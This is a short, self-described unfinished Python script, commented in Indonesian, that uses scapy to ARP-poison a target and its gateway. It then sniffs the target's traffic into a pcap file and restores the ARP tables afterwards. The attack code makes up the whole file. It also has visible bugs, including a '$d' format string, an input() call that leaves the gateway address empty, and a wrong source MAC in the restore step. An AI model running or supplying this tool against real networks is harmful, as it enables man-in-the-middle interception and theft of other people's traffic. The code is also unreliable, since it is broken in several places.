from scapy.all import *
import os
import sys
import threading
import signal

def get_mac(ip_address):
    res, unansw = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
    for s,r in res:
        return r[Ether].src
    return None

def ptarget(gateway_ip,gateway_mac,target_ip,target_mac):
    # pada bagian ini, akan diisi source dan destination untuk target
    ptarget = ARP()
    ptarget.op = 2
    ptarget.psrc = gateway_ip
    ptarget.pdst = target_ip
    ptarget.hwdst = target_mac
    # dan pada bagian ini akan diisi source dan destination untuk gateway
    pgateway = ARP()
    pgateway.op = 2
    pgateway.psrc = target_ip
    pgateway.pdst = gateway_ip
    pgateway.hwdst = gateway_mac

    while True:
        try:
            send(ptarget)
            send(pgateway)
            time.sleep(2)
        except KeyboardInterrupt:
            # jika ingin dihentikan arp poisoning ketik ctrl + c 
            # dan target akan diperbaiki/restore
            restore_target(gateway_ip,gateway_mac,target_ip,target_mac)

def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
    print ("Restoring target... ")
    # perbaiki kembali ip target dan gateway dari victim menggunakan fucntion send dan ARP
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    os.kill(os.getpid(),signal.SIGINT)

def main():
    # inisialisasi interface ip target 
    # dan packet_count serta deklarasi ip gateway
    interface = "en1"
    target_ip = "localhost"
    gateway_ip = ""
    packet_count = 1000
    # input gateway IP sendiri
    print("gateway ip:")
    input(gateway_ip)

    conf.iface = interface
    conf.verb = 0

    print ("[*] Settig up %s" % interface)
    # dapatkan mac address dari ip gateway dan target
    gateway_mac = get_mac(gateway_ip)
    target_mac = get_mac(target_ip)

    if target_mac is None:
        print ("Failed to get target MAC. Exiting.")
        sys.exit(1)
    else:
        print ("[*] Target %s is at %s" % (target_ip,target_mac))
    
    # mulai thread poison
    poison = threading.Thread(target = ptarget, args = (gateway_ip,gateway_mac,target_ip,target_mac))
    poison.start()

    try: 
        print ("starting sniffer for $d packets" % packet_count)
        bpfFilter = ("ip host %s" % target_ip)
        packets = sniff(count=packet_count,filter=bpfFilter,iface=interface)

        wrpcap('arper.pcap',packets)
        # ip dan mac address target dan gateway akan di-restore atau 
        # seperti semula diperbaiki
        restore_target(gateway_ip,gateway_mac,target_ip,target_mac)

    except KeyboardInterrupt:
        restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
        sys.exit(1)

if __name__ == "__main__":
    main()


# This code is not done yet, but I'm willing to submit for input and opinion on ARP Poisoning using Python